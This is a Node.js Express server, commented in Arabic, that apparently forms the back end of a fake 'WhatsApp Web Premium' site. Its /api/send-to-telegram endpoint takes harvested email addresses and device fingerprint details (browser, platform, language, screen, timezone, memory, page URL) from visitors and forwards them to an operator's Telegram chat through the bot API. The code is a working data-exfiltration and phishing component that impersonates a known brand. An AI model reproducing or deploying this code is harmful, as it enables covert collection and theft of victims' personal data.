const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.static(path.join(__dirname, '.')));
app.use(express.json());

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API لإرسال البيانات للتلجرام
app.post('/api/send-to-telegram', async (req, res) => {
    console.log('📨 Received request to send Telegram message');
    
    try {
        const { message, data } = req.body;
        
        // الحصول على التوكن والآيدي من environment variables
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        console.log('🔑 Telegram Config:', {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID,
            tokenLength: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.length : 0
        });

        // التحقق من وجود الإعدادات
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('❌ Missing Telegram configuration');
            return res.status(400).json({ 
                success: false, 
                error: 'إعدادات التلجرام غير موجودة',
                details: {
                    token: TELEGRAM_BOT_TOKEN ? 'Exists' : 'Missing',
                    chatId: TELEGRAM_CHAT_ID ? 'Exists' : 'Missing'
                }
            });
        }

        // بناء رسالة التلجرام
        const telegramMessage = `
${message}

📧 **الإيميلات المجمعة (${data.emails ? data.emails.length : 0}):**
${data.emails && data.emails.length > 0 ? 
    data.emails.slice(0, 10).map(email => `• ${email}`).join('\n') : 
    '• لم يتم العثور على إيميلات'}

${data.emails && data.emails.length > 10 ? `\n... و ${data.emails.length - 10} أكثر` : ''}

📱 **معلومات الجهاز:**
• المتصفح: ${data.deviceInfo?.userAgent?.split(' ')[0] || 'غير معروف'}
• النظام: ${data.deviceInfo?.platform || 'غير معروف'}
• اللغة: ${data.deviceInfo?.language || 'غير معروف'}
• الشاشة: ${data.deviceInfo?.screen?.width || 0}x${data.deviceInfo?.screen?.height || 0}

🌍 **المزيد:**
• المنطقة: ${data.deviceInfo?.timezone || 'غير معروف'}
• الذاكرة: ${data.deviceInfo?.hardware?.deviceMemory || 'غير معروف'}GB

⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
🔗 **الرابط:** ${data.metadata?.pageUrl || 'غير معروف'}
        `.trim();

        console.log('📤 Sending to Telegram:', {
            chatId: TELEGRAM_CHAT_ID,
            messageLength: telegramMessage.length
        });

        // إرسال إلى التلجرام
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'Markdown'
            })
        });

        const result = await telegramResponse.json();
        
        console.log('📩 Telegram API Response:', {
            ok: telegramResponse.ok,
            status: telegramResponse.status,
            result: result
        });

        if (!telegramResponse.ok) {
            throw new Error(`Telegram API error: ${result.description || 'Unknown error'}`);
        }

        res.json({
            success: true,
            message: 'تم إرسال البيانات إلى التلجرام بنجاح',
            telegramResponse: result
        });

    } catch (error) {
        console.error('❌ Error in Telegram sending:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            step: 'telegram_sending'
        });
    }
});

// health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: '✅ يعمل', 
        timestamp: new Date().toISOString(),
        service: 'WhatsApp Web Premium',
        telegramConfigured: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID)
    });
});

// endpoint لفحص الإعدادات
app.get('/config-check', (req, res) => {
    res.json({
        telegram: {
            token: process.env.TELEGRAM_BOT_TOKEN ? '✅ موجود' : '❌ مفقود',
            chatId: process.env.TELEGRAM_CHAT_ID ? '✅ موجود' : '❌ مفقود',
            tokenPreview: process.env.TELEGRAM_BOT_TOKEN ? 
                process.env.TELEGRAM_BOT_TOKEN.substring(0, 10) + '...' : 'غير معروف'
        },
        environment: process.env.NODE_ENV || 'غير معروف',
        port: process.env.PORT || 3000
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 السيرفر يعمل على البورت ${PORT}`);
    console.log(`📧 بوت التلجرام: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ مضبوط' : '❌ غير مضبوط'}`);
    console.log(`💬 آيدي الشات: ${process.env.TELEGRAM_CHAT_ID ? '✅ مضبوط' : '❌ غير مضبوط'}`);
});
